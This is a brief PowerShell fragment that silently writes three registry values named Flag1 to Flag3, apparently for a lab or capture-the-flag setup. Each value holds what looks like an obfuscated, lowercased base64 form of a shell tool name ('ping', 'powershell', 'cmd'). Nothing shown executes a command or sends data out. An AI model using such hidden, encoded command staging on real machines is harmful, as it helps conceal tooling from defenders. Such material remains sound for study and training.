          Set-ItemProperty -Path $configRegPath -Name 'Flag1' -Value 'cgluzya' -Force -ErrorAction SilentlyContinue
          Set-ItemProperty -Path $configRegPath -Name 'Flag2' -Value 'cg93zxjzagvsba' -Force -ErrorAction SilentlyContinue
          Set-ItemProperty -Path $configRegPath -Name 'Flag3' -Value 'y21kia' -Force -ErrorAction SilentlyContinue
